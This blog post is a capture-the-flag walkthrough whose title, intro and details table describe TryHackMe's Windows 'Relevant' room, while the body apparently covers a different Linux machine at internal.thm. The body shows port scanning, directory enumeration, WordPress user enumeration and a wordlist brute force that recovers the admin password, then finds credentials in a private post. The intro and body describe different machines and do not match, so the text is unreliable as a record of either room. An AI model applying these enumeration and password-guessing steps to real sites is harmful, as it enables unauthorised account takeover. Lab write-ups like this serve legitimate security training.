---
title: "Walk-through of Relevant from TryHackMe"
header:
  teaser: /assets/images/2021-03-01-22-57-12.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - 
---

## Machine Information

![relevant](/assets/images/2021-03-01-22-57-12.png)

Relevant is rated as a medium difficulty room on TryHackMe. We have no information given in the room description, but after enumerating ports we find we are dealing with a Windows 2016 server. There is an anonymous SMB share which we find is also accessible from an IIS server running on an alternate port. From there we upload a reverse shell to gain a foothold, then use the PrintSpoofer exploit to escalate to system level access.
<!--more-->

Skills required are basic port enumeration and exploration knowledge. Skills learned are abusing poorly configured IIS web servers and finding relevant exploits for escalation.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Relevant](https://tryhackme.com/room/relevant) |
| Machine Release Date | 24th July 2020 |
| Date I Completed It | 2nd March 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

The pre-engagment briefing for the room tells us to ensure we add internal.thm to our local hosts file. That makes me think there's probably a web server, maybe we have multiple subdomains, or sites using host headers. Let's do as instructed:

```text
root@kali:/home/kali/thm/internal# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.249.199   internal.thm
```

Now let's start with Nmap to check for open ports:

```text
root@kali:/home/kali/thm/internal# ports=$(nmap -p- --min-rate=1000 -T4 internal.thm | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)                    
root@kali:/home/kali/thm/internal# nmap -p$ports -sC -sV -oA internal internal.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 21:58 GMT
Nmap scan report for internal.thm (10.10.249.199)
Host is up (0.034s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looks like we have a Linux server, possible Ubuntu,  with just two ports open. Apache 2.4.29 running on port 80 and OpenSSH 7.6p1 on port 22. 

Before moving on let's do a quick check of those versions:

```text
root@kali:/home/kali/thm/internal# searchsploit apache 2.4.29
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                              | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                            | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                        | linux/local/46676.php
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                          | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                         | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                   | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                   | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                          | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                            | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                          | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                    | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2) | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                 | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                             | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------- ---------------------------------

root@kali:/home/kali/thm/internal# searchsploit openssh 7.6
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                               | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                         | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Nothing on Exploit-DB. Let's move on to looking at port 80 first:

![internal-apache](/assets/images/2021-03-02-22-11-46.png)

Just the standard install page for Apache, nothing hidden in the source, time for gobuster:

```text
root@kali:/home/kali/thm/internal# gobuster -t 50 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://internal.thm
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/02 22:13:29 Starting gobuster
===============================================================
http://internal.thm/wordpress (Status: 301)
http://internal.thm/javascript (Status: 301)
http://internal.thm/blog (Status: 301)
http://internal.thm/phpmyadmin (Status: 301)
http://internal.thm/server-status (Status: 403)
===============================================================
2021/03/02 22:15:52 Finished
===============================================================
```

We have a number of interesting subfolders. The one that jumps out is WordPress, because when doing CTFs that is often the starting point. Trying /wordpress redirects us to /bog:

![internal-blog](/assets/images/2021-03-02-22-25-04.png)

We have a vanilla WordPress site with a single test post by the user admin. Let's try wpscan to see what we can find:

```text
root@kali:/home/kali/thm/internal# wpscan --url http://internal.thm/blog -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://internal.thm/blog/ [10.10.249.199]
[+] Started: Tue Mar  2 22:20:59 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar  2 22:21:05 2021
[+] Requests Done: 70
[+] Cached Requests: 7
[+] Data Sent: 16.783 KB
[+] Data Received: 16.51 MB
[+] Memory used: 181.422 MB
[+] Elapsed time: 00:00:05
root@kali:/home/kali/thm/internal# 
```

We have confirmation the version of WordPress is 5.4.2, an out of date theme but not much else. We do have the user admin, let's try rockyou against it and see if we can brute force our way in:

```text
root@kali:/home/kali/thm/internal# wpscan --url internal.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 100
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/wordpress/ [10.10.249.199]
[+] Started: Tue Mar  2 22:31:33 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <========================================================> (22 / 22) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys
Trying admin / marquez Time: 00:00:45 <                                                     > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar  2 22:32:35 2021
[+] Requests Done: 3956
[+] Cached Requests: 5
[+] Data Sent: 1.884 MB
[+] Data Received: 2.585 MB
[+] Memory used: 254.047 MB
[+] Elapsed time: 00:01:01
```

We have the password for admin, what a great start. Let's try logging in:

![internal-wplogin](/assets/images/2021-03-02-22-41-35.png)

This works and we get to the admin dashboard:

![internal-wpdashboard](/assets/images/2021-03-02-22-39-08.png)

First I looked at the posts section and found a private one:

![internal-privatepost](/assets/images/2021-03-02-22-43-01.png)

If we edit the post we see some credentials:

![internal-creds](/assets/images/2021-03-02-22-43-48.png)

I'm not sure where to use these at the moment, so make a note for later.